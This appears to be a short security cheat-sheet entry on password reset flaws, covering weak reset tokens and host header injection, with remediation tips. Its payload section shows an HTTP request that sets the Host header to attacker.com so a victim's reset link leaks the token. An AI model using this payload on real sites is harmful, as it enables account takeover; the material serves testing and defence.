# Password Reset Flaws

## Summary
Exploit weaknesses in password reset functionality.

## Detection

### Token Weakness
- Predictable tokens (timestamp, short numeric)
- Token sent in URL (leaked via Referer)
- Token not invalidated after use

### Host Header Injection
- Modify `Host` header to point reset link to your domain
- Catch the reset token

## Payloads

```
POST /reset-password
Host: attacker.com
Content-Type: application/json
{"email":"victim@example.com"}

→ Reset link sent to victim but pointing to attacker.com
```

## Remediation
- Cryptographic random tokens
- Invalidate tokens after use/expiry
- Validate Host header or use absolute paths
